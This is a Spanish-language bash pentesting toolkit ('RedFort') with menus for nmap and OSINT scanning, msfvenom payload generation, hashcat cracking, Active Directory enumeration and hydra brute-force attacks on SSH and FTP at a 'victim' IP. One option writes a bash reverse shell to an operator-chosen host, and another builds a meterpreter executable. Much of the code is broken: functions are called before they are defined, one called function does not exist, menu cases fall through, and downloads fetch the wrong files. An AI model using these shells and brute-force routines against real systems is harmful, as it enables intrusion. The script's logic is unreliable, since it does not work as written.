#!/bin/bash

session_log="session_log.txt"
log_dir="./logs"
mkdir -p "$log_dir"

function instalar_herramientas() {
    if [ ! -f ".tools_installed" ]; then
        echo "Actualizando el sistema..."
        sudo apt update && sudo apt upgrade -y

        echo "Verificando herramientas necesarias..."

        herramientas=(nmap hashcat theharvester metasploit-framework hydra python3 sublist3r)

        for herramienta in "${herramientas[@]}"; do
            if ! command -v $herramienta &> /dev/null; then
                echo "$herramienta no está instalado. Instalando..."
                if [[ "$herramienta" == "metasploit-framework" ]]; then
                    curl -sSL https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate > msfupdate.sh
                    bash msfupdate.sh
                else
                    sudo apt-get install -y $herramienta
                fi
            else
                echo "$herramienta ya está instalado."
            fi
        done

        touch .tools_installed
        echo "Todas las herramientas necesarias han sido verificadas e instaladas."
    else
        echo "Las herramientas ya han sido instaladas."
    fi
}

function menu_principal() {
    clear
    echo "========================"
    figlet "RedFort"
    echo "                        by GarboX0"
    echo "========================"
    echo "1. Enumeración Automatizada (NMAP, OSINT)"
    echo "2. Generación de Payloads y Reverse Shells"
    echo "3. Cracking de Hashes"
    echo "4. CheatSheets"
    echo "5. Herramientas de Active Directory"
    echo "6. Ataques de Fuerza Bruta (Hydra)"
    echo "7. Escáner de Subdominios"
    echo "8. Unificar Reportes"
    echo "9. Salir"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) submenu_enumeracion ;;
        2) submenu_payloads ;;
        3) submenu_hashes ;;
        4) submenu_cheatsheets ;;
        5) submenu_ad ;;
        6) submenu_fuerza_bruta ;;
        7) submenu_subdominios ;;
        8) unificar_reportes ;;
        9) exit 0 ;;
        *) echo "Opción inválida!" && sleep 2 && menu_principal ;;
    esac
}

function submenu_enumeracion() {
    clear
    echo "========================"
    echo "   Enumeración Automatizada"
    echo "========================"
    echo "1. Escaneo rápido con NMAP"
    echo "2. Escaneo de puertos con NMAP"
    echo "3. Enumeración OSINT (theHarvester)"
    echo "4. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) nmap_scan_rapido ;;
        2) nmap_scan_puertos ;;
        3) osint_harvester ;;
        4) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_enumeracion ;;
    esac
}

function generar_reporte() {
    echo "Generando reporte..."
    
    local report_dir="reportes_unificados"
    mkdir -p "$report_dir"

    local report_name="$report_dir/reporte_$(date +"%Y-%m-%d_%H-%M").txt"

    {
        echo "==== Reporte de Pentesting ===="
        echo "Fecha: $(date +"%Y-%m-%d %H:%M:%S")"
        echo "Nombre del Pentester: $USER"
        echo "Sistema objetivo: $target_ip"
        echo ""

        for log_file in "$log_dir"/*; do
            echo "==== Resultados de $(basename "$log_file") ===="
            if [ -s "$log_file" ]; then
                cat "$log_file"
            else
                echo "No se encontraron resultados."
            fi
            echo ""
        done

        echo "==== Análisis de Resultados ===="
        echo "Automatización del análisis: Se recomienda revisar las vulnerabilidades."
        echo ""

        echo "==== Recomendaciones ===="
        echo "Revisión de configuraciones de firewall."
    } > "$report_name"

    echo "Reporte generado y almacenado en: $report_name"
    rm "$session_log" 2>/dev/null || echo "No se encontró archivo de sesión."

    echo "Proceso completado. Presiona Enter para continuar..."
    read -r

    menu_principal
}

function unificar_reportes() {
    echo "Unificando reportes..."

    reportes=(*reporte_*.txt)

    if [ ${#reportes[@]} -eq 0 ]; then
        echo "No se encontraron reportes para unificar."
        return
    fi

    reporte_unificado="reporte_unificado_$(date +"%Y-%m-%d_%H-%M").txt"

    {
        echo "==== Reporte Unificado ===="
        echo "Fecha: $(date +"%Y-%m-%d %H:%M:%S")"
        echo "Nombre del Pentester: $USER"
        echo ""
        for reporte in "${reportes[@]}"; do
            echo "==== Contenido de $reporte ===="
            cat "$reporte"
            echo ""
        done
    } > "$reporte_unificado"

    echo "Reporte unificado generado: $reporte_unificado"
    
    rm "${reportes[@]}"
    echo "Reportes individuales borrados."

    echo "Proceso de unificación completado. Presiona Enter para continuar..."
    read -r
}

function manejar_hashes() {
    clear
    echo "=== Hashes Files ==="
    echo "1. Descargar y usar hash.txt por defecto"
    echo "2. Cargar hashes desde archivo local"
    echo "3. Volver al menú principal"
    
    read -p "Selecciona una opción: " opcion
    case $opcion in
        1) descargar_y_generar_hashes ;;
        2) cargar_hashes ;;
        3) menu_principal ;;
        *) echo "Opción no válida. Intenta de nuevo." && manejar_hashes ;;
    esac
}

function descargar_y_generar_hashes() {
    echo "Descargando lista de hashes por defecto..."
    curl -o "$log_dir/hash.txt" "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
    echo "Lista de hashes descargada como hash.txt."
    
    echo "Ejecutando Hashcat..." | tee -a "$session_log"
    if sudo hashcat -m 0 "$log_dir/hash.txt" "$log_dir/rockyou.txt" | tee -a "$session_log"; then
        echo "Herramientas ejecutadas con éxito. Generando reporte..."
        generar_reporte
    else
        echo "Error al ejecutar Hashcat."
    fi
}

# Llamada inicial al menú principal
instalar_herramientas
menu_principal

function cargar_hashes() {
    read -p "Ingresa la ruta del archivo de hashes: " ruta_archivo

    if [ -f "$ruta_archivo" ]; then
        cp "$ruta_archivo" hash.txt 
        echo "Hashes cargados desde $ruta_archivo." | tee -a "$session_log"
        
        echo "Ejecutando Hashcat..." | tee -a "$session_log"
        sudo hashcat -m 0 hash.txt rockyou.txt | tee -a "$session_log"
    else
        echo "El archivo no existe. Por favor verifica la ruta." | tee -a "$session_log"
    fi

    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
}

function ejecutar_herramientas() {
    echo "Iniciando la ejecución automatizada de herramientas..." | tee -a "$session_log"
    
    echo "==== Inicio de la sesión: $(date) ====" > "$session_log"
    
    echo "Ejecutando Nmap..." | tee -a "$session_log"
    sudo nmap -sP "$target_ip" | tee -a "$session_log"
    
    if [ ! -f "hash.txt" ]; then
        echo "Descargando lista de hashes por defecto..." | tee -a "$session_log"
        curl -o hash.txt "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
        echo "Lista de hashes descargada como hash.txt." | tee -a "$session_log"
    else
        echo "Usando hash.txt existente." | tee -a "$session_log"
    fi
    
    echo "Ejecutando Hashcat..." | tee -a "$session_log"
    sudo hashcat -m 0 hash.txt rockyou.txt | tee -a "$session_log"
    
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
}

function nmap_scan_rapido() {
    read -p "Ingresa la IP o rango a escanear: " ip
    sudo nmap -sP $ip | tee -a "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_enumeracion
}

function nmap_scan_puertos() {
    read -p "Ingresa la IP o rango a escanear: " ip
    sudo nmap -sS $ip | tee -a "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_enumeracion
}

function osint_harvester() {
    read -p "Ingresa el dominio para el escaneo OSINT: " dominio
    sudo theHarvester -d $dominio -l 500 -b all | tee -a "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_enumeracion
}

function submenu_payloads() {
    clear
    echo "========================"
    echo "   Generación de Payloads y Reverse Shells"
    echo "========================"
    echo "1. Generar Payload con msfvenom"
    echo "2. Crear Reverse Shell en Bash"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) generar_payload ;;&
        2) crear_reverse_shell ;;&
        3) menu_principal ;;&
        *) echo "Opción inválida!" && sleep 2 && submenu_payloads ;;&
    esac
}

function generar_payload() {
    read -p "Ingresa tu IP (LHOST): " ip
    read -p "Ingresa el puerto a usar (LPORT): " puerto
    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto -f exe > payload.exe
    echo "Payload generado: payload.exe" | tee -a "$session_log"
    echo "Payload generado con msfvenom (LHOST: $ip, LPORT: $puerto)" >> "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_payloads
}

function crear_reverse_shell() {
    read -p "Ingresa tu IP: " ip
    read -p "Ingresa el puerto: " puerto
    echo "bash -i >& /dev/tcp/$ip/$puerto 0>&1" > reverse_shell.sh
    echo "Reverse shell creado en reverse_shell.sh" | tee -a "$session_log"
    echo "Reverse shell creado (IP: $ip, Puerto: $puerto)" >> "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_payloads
}

function submenu_hashes() {
    clear
    echo "========================"
    echo "   Cracking de Hashes"
    echo "========================"
    echo "1. Crackear Hash con Hashcat"
    echo "2. Detectar tipo de Hash"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) crackear_hash ;;&
        2) detectar_tipo_hash ;;&
        3) menu_principal ;;&
        *) echo "Opción inválida!" && sleep 2 && submenu_hashes ;;&
    esac
}

function crackear_hash() {
    read -p "Ingresa el archivo de hashes: " archivo
    read -p "Ingresa el wordlist a usar: " wordlist
    sudo hashcat -a 0 -m 0 $archivo $wordlist | tee -a "$session_log"
    echo "Hashcat ejecutado en $archivo con wordlist $wordlist" >> "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_hashes
}

function detectar_tipo_hash() {
    read -p "Ingresa el hash: " hash
    sudo hashid -m $hash | tee -a "$session_log"
    echo "Tipo de hash detectado: $hash" >> "$session_log"
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_hashes
}

function submenu_cheatsheets() {
    clear
    echo "========================"
    echo "   Cheatsheets"
    echo "========================"
    echo "1. Linux Cheatsheet"
    echo "2. Windows Cheatsheet"
    echo "3. Pivoting & Transferencia de Archivos"
    echo "4. Volver al Menú Principal"
    echo ""

    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) cat cheatsheets/linux.txt ;;&
        2) cat cheatsheets/windows.txt ;;&
        3) cat cheatsheets/pivoting.txt ;;&
        4) menu_principal ;;&
        *) echo "Opción inválida!" && sleep 2 && submenu_cheatsheets ;;&
    esac

    read -p "Presiona Enter para continuar..." && submenu_cheatsheets
}

function submenu_ad() {
    clear
    echo "========================"
    echo "   Herramientas de Active Directory"
    echo "========================"
    echo "1. Enumerar usuarios AD"
    echo "2. Enumerar grupos AD"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) enumerar_usuarios_ad ;;
        2) enumerar_grupos_ad ;;
        3) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_ad ;;
    esac
}

function enumerar_usuarios_ad() {
    read -p "Ingresa la IP del DC: " dc_ip
    read -p "Ingresa el dominio (domain): " dominio
    read -p "Ingresa el usuario: " usuario
    read -s -p "Ingresa la contraseña: " password
    echo # Nueva línea para mejor visualización
    sudo python3 GetADUsers.py -dc-ip "$dc_ip" "$dominio/$usuario:$password"
    echo "Usuarios enumerados desde $dc_ip" >> "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_ad
}

function submenu_fuerza_bruta() {
    clear
    echo "========================"
    echo "   Ataques de Fuerza Bruta"
    echo "========================"
    echo "1. Ataque SSH con Hydra"
    echo "2. Ataque FTP con Hydra"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) ataque_ssh ;;
        2) ataque_ftp ;;
        3) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_fuerza_bruta ;;
    esac
}

function ataque_ssh() {
    read -p "Ingresa la IP de la víctima: " ip
    read -p "Ingresa el archivo de usuarios (deja en blanco para usar el predeterminado): " usuarios
    read -p "Ingresa el archivo de contraseñas (deja en blanco para usar el predeterminado): " contrasenas

    if [ -z "$usuarios" ]; then
        if [ ! -f "userlist.txt" ]; then
            echo "Descargando lista de usuarios predeterminada..."
            curl -o userlist.txt "https://github.com/jeanphorn/wordlist/blob/master/usernames.txt"
        fi
        usuarios="userlist.txt"
        echo "Usando la lista de usuarios predeterminada: $usuarios"
    fi

    if [ -z "$contrasenas" ]; then
        if [ ! -f "wordlist.txt" ]; then
            echo "Descargando lista de contraseñas predeterminada..."
            curl -o wordlist.txt "https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt"
        fi
        contrasenas="wordlist.txt"
        echo "Usando la lista de contraseñas predeterminada: $contrasenas"
    fi

    ssh_log="ssh_attack_log_$(date +"%Y-%m-%d_%H-%M").txt"
    
    sudo hydra -L "$usuarios" -P "$contrasenas" -t 4 ssh://"$ip" -o "$ssh_log"
    
    if [ -f "$ssh_log" ] && grep -q "login:" "$ssh_log"; then
        echo "Ataque SSH exitoso en $ip. Detalles guardados en $ssh_log."
    else
        echo "Ataque SSH fallido en $ip. Detalles guardados en $ssh_log."
    fi
    
    echo "Ataque SSH ejecutado en $ip usando $usuarios y $contrasenas. Ver detalles en $ssh_log." >> "$session_log"
    
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
}

function ataque_ftp() {
    read -p "Ingresa la IP de la víctima: " ip
    read -p "Ingresa el archivo de usuarios: " usuarios
    read -p "Ingresa el archivo de contraseñas: " contrasenas

    if [ ! -f "$usuarios" ]; then
        echo "El archivo de usuarios no existe."
        return
    fi

    if [ ! -f "$contrasenas" ]; then
        echo "El archivo de contraseñas no existe."
        return
    fi

    sudo hydra -L "$usuarios" -P "$contrasenas" ftp://"$ip"
    echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas" >> "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
}

function submenu_subdominios() {
    clear
    echo "========================"
    echo "   Escáner de Subdominios"
    echo "========================"
    echo "1. Escaneo de Subdominios"
    echo "2. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) escanear_subdominios ;;
        2) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_subdominios ;;
    esac
}

function escanear_subdominios() {
    read -p "Ingresa el dominio objetivo: " dominio
    sudo sublist3r -d "$dominio"
    echo "Escaneo de subdominios ejecutado para $dominio" >> "$session_log"
    generar_reporte
    read -p "Presiona Enter para continuar..." && submenu_subdominios
}

bienvenida
menu_principal